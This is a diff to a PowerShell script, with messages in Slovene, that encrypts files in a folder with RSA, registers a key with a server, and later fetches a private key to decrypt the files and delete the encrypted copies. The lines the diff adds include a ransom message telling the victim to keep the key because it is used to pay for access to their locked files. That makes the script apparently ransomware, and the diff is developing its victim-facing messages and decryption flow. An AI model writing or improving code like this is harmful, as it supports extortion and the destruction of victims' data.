@@ -46,8 +46,11 @@ function Decrypt-Files($privateKeyXml, $filesPath) {
     $rsa.PersistKeyInCsp = $false
     $rsa.FromXmlString($privateKeyXml)
     $sourceDir = $filesPath
-
+    
+    cls
     Get-ChildItem $sourceDir -Filter *.e | ForEach-Object {
+        $output = "$sourceDir\$($_.BaseName)"
+        Write-Host "Odklepanje $output"
         $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
         $chunkSize = 256
         $decrypted = New-Object System.Collections.Generic.List[byte]
@@ -60,8 +63,8 @@ function Decrypt-Files($privateKeyXml, $filesPath) {
                 continue
             }
         }
-        $output = "$sourceDir\$($_.BaseName)"
         [System.IO.File]::WriteAllBytes($output, $decrypted.ToArray())
+        Write-Host "Odklenjeno: $output"
         Remove-Item $_.FullName
     }
 }
@@ -96,10 +99,12 @@ switch ($Mode.ToLower()) {
     "encrypt" {
         if (!$FilesPath) { exit 2 }
         $reg = Register-Key
-        Write-Host $reg
         $publicKeyXml = $reg.publicKeyXml
+        $hash = $reg.hash
         Encrypt-Files $FilesPath $publicKeyXml
         Save-SerialKey $FilesPath $reg.hash
+        Write-Host "Kljuc za komunikacijo: $hash"
+        Write-Host "Kljuc shranite, saj z njim placate dostop do vasih zaklenjenih datotek!"
         exit 0
     }
     "decrypt" {
@@ -117,13 +122,14 @@ switch ($Mode.ToLower()) {
                 $privateKeyXmlString = [string]$privateKeyXml
             }
             if ($privateKeyXmlString -notmatch "<RSAKeyValue>") {
-                Write-Host "Odziv strežnika: $privateKeyXmlString"
-                Write-Host "Napačna koda za dostop ali pa ni bilo mogoče pridobiti ključa iz strežnika."
-                exit 3
+                Write-Host "Odziv streznika: $privateKeyXmlString"
+            } else {
+                Write-Host "Odklepanje datotek... (Lahko traja dlje casa...)"
             }
             $filesPath = $serial.FilesPath
             Decrypt-Files $privateKeyXmlString $filesPath
             Remove-Item "$PSScriptRoot\serialkey"
+            Write-Host "Datoteke odklenjene!"
             exit 0
         } catch {
             Write-Host "Napaka med odklepanjem."
